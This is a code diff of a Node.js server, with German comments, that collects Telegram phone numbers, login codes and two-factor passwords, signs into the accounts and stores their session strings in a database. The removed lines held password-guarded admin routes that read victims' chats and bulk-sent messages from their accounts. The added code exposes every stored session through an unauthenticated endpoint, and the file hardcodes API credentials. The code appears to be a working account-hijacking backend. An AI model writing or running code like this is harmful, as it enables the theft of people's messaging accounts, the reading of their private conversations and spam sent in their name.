@@ -5,21 +5,26 @@ const { StringSession } = require('telegram/sessions');
 const mongoose = require('mongoose');
 
 const app = express();
-app.use(cors());
+app.use(cors({ origin: '*' })); // CORS für alle Anfragen öffnen
 app.use(express.json());
 
-const PORT = process.env.PORT || 3000;
-const MONGO_URI = process.env.MONGODB_URI; // Stelle sicher, dass dies in Render als Config Var gesetzt ist!
-mongoose.connect(MONGO_URI);
+// Konfiguration - Ersetze hier mit deinen Werten
+const apiId = 23049703; 
+const apiHash = 'e9c00af578a9de0253ef02337460498f';
+const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';
 
-const SessionSchema = new mongoose.Schema({ phone: String, session: String });
+mongoose.connect(MONGO_URI).then(() => console.log("DB Verbunden")).catch(err => console.log(err));
+
+const SessionSchema = new mongoose.Schema({
+    phone: String,
+    session: String,
+    date: { type: Date, default: Date.now }
+});
 const Session = mongoose.model('Session', SessionSchema);
 
-const apiId = 23049703;
-const apiHash = 'e9c00af578a9de0253ef02337460498f';
 const activeSessions = new Map();
 
-// --- Login Endpunkte ---
+// --- LOGIN FLOW ---
 app.post('/send-otp', async (req, res) => {
     try {
         const { phone } = req.body;
@@ -27,60 +32,49 @@ app.post('/send-otp', async (req, res) => {
         await client.connect();
         const result = await client.sendCode({ apiId, apiHash }, phone);
         activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
-        res.json({ phoneCodeHash: result.phoneCodeHash });
-    } catch (e) { res.status(400).json({ error: e.message }); }
+        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
+    }
 });
 
 app.post('/verify-otp', async (req, res) => {
     try {
         const { phone, code, phoneCodeHash, password } = req.body;
-        const s = activeSessions.get(phone);
-        if (!s) return res.status(400).json({ error: "Session abgelaufen" });
+        const session = activeSessions.get(phone);
+        if (!session) return res.status(400).json({ error: "Session abgelaufen" });
 
         try {
-            await s.client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash }));
+            await session.client.signIn({
+                phoneNumber: phone,
+                phoneCode: code,
+                phoneCodeHash: phoneCodeHash
+            });
         } catch (err) {
             if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
-                const pwd = await s.client.invoke(new Api.account.GetPassword());
-                await s.client.invoke(new Api.auth.CheckPassword({ password: await s.client.srpSolve(pwd, password) }));
-            } else throw err;
+                if (!password) return res.json({ twoFactorRequired: true });
+                const pwd = await session.client.invoke(new Api.account.GetPassword());
+                await session.client.signInPassword({ password: password }, pwd);
+            } else {
+                throw err;
+            }
         }
-        await Session.create({ phone, session: s.client.session.save() });
+        const sessionString = session.client.session.save();
+        await Session.create({ phone, session: sessionString });
         res.json({ success: true });
-    } catch (e) { res.status(400).json({ error: e.message }); }
-});
-
-// --- Admin Endpunkte ---
-app.get('/admin/sessions', async (req, res) => {
-    if (req.query.pass !== '280597') return res.status(401).send('No');
-    const sessions = await Session.find({});
-    res.json(sessions);
-});
-
-app.get('/admin/get-dialogs', async (req, res) => {
-    const { sessionId } = req.query;
-    const dbSession = await Session.findById(sessionId);
-    const client = new TelegramClient(new StringSession(dbSession.session), apiId, apiHash, {});
-    await client.connect();
-    const dialogs = await client.getDialogs();
-    // Filtert nur Gruppen/Channels/User
-    const filtered = dialogs.map(d => ({ id: d.id.toString(), title: d.title || 'User', isGroup: d.isGroup, isChannel: d.isChannel }));
-    await client.disconnect();
-    res.json(filtered);
-});
-
-app.post('/admin/bulk-send', async (req, res) => {
-    const { sessionId, targets, message } = req.body;
-    const dbSession = await Session.findById(sessionId);
-    const client = new TelegramClient(new StringSession(dbSession.session), apiId, apiHash, {});
-    await client.connect();
-    
-    for (const targetId of targets) {
-        try { await client.sendMessage(targetId, { message }); } 
-        catch (err) { console.log("Fehler bei " + targetId); }
+    } catch (e) {
+        res.status(400).json({ error: e.message });
     }
-    await client.disconnect();
-    res.json({ success: true });
 });
 
-app.listen(PORT, () => console.log('Running'));
+// --- ADMIN ENDPOINTS ---
+app.get('/get-sessions', async (req, res) => {
+    try {
+        const sessions = await Session.find({});
+        res.json(sessions);
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.listen(process.env.PORT || 3000, () => console.log("Server läuft."));
